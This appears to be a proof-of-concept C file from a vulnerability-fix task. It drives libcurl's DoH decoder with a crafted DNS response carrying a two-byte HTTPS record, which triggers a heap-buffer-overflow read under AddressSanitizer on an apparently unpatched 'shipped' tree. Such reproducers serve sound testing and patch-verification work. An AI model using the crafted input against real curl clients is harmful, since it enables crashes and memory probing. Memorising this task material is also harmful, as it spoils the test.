/*
 * Residual PoC for the DoH HTTPS (type 65) RDATA length handling.
 *
 * Drives libcurl's DNS-over-HTTPS response decoder, doh_resp_decode(), with a
 * crafted-but-well-formed DNS response that carries a single HTTPS answer
 * record whose RDATA is exactly two octets long (SvcPriority only, no
 * TargetName). This is the same entry point curl's own unit1650 uses.
 *
 * Build (against the ASan + UNITTESTS libcurlu-d.a):
 *   clang -fsanitize=address -g -O1 pocs/residual.c \
 *         build/lib/libcurlu-d.a -lssl -lcrypto -lz -lzstd -lbrotlidec \
 *         -lpthread -o /tmp/residual
 *   /tmp/residual
 *
 * On the shipped tree this aborts under AddressSanitizer with a
 * heap-buffer-overflow READ; on the golden tree it returns cleanly.
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

/* Minimal mirror of the relevant libcurl types (lib/vdns/doh.h), built with
   USE_HTTPSRR so the dohentry layout matches the linked library. */
typedef enum {
  DOH_OK
} DOHcode_min;

typedef enum {
  CURL_DNS_TYPE_A = 1,
  CURL_DNS_TYPE_AAAA = 28,
  CURL_DNS_TYPE_HTTPS = 65
} DNStype_min;

#define DOH_MAX_ADDR  24
#define DOH_MAX_HTTPS 4

struct dohaddr {
  int type;
  union {
    unsigned char v4[4];
    unsigned char v6[16];
  } ip;
};

struct dohhttps_rr {
  uint16_t len;
  unsigned char *val;
};

struct dohentry {
  struct dohaddr addr[DOH_MAX_ADDR];
  int numaddr;
  unsigned int ttl;
  struct dohhttps_rr https_rrs[DOH_MAX_HTTPS];
  int numhttps_rrs;
};

extern void de_init(struct dohentry *de);
extern void de_cleanup(struct dohentry *d);
extern int doh_resp_decode(const unsigned char *doh, size_t dohlen,
                           int dnstype, struct dohentry *d);

int main(void)
{
  /* A valid DNS response with one HTTPS (type 65) answer. The record's
     RDATA is the final content of the packet. Byte 22 holds the RDATA
     length; we set it to 2 and truncate the buffer to match, so the packet
     ends immediately after the 2-byte SvcPriority. */
  static const unsigned char templ[] = {
    0x00, 0x00, 0x81, 0x80, 0x00, 0x00, 0x00, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00,
    0x00
  };
  size_t dohlen = 23 + 2; /* header..rdlength (23) + 2-octet RDATA */
  unsigned char *doh = malloc(dohlen);
  struct dohentry d;
  int rc;

  memcpy(doh, templ, dohlen);

  de_init(&d);
  rc = doh_resp_decode(doh, dohlen, CURL_DNS_TYPE_HTTPS, &d);
  printf("doh_resp_decode returned %d, numhttps_rrs=%d\n", rc, d.numhttps_rrs);
  de_cleanup(&d);
  free(doh);
  return 0;
}
